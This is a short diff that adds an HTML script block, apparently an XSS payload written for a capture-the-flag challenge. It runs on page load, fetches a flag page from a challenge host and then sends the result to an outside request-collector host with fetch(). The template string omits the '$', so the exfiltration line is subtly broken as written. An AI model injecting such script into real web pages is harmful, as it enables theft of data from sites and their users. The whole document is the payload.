@@ -1,0 +1,14 @@
+<script>
+  async function displayFileContentsAsync() {
+  try {
+    const response = await fetch('https://typhoonconctf-2023-half-of-fake.chals.io/flag');
+    const text = await response.text();
+    console.log(text);
+		const resp = await fetch(`https://tolololo.requestcatcher.com/{text}`)
+  } catch (error) {
+    console.error(error);
+  }
+}
+  
+  displayFileContentsAsync()
+</script>
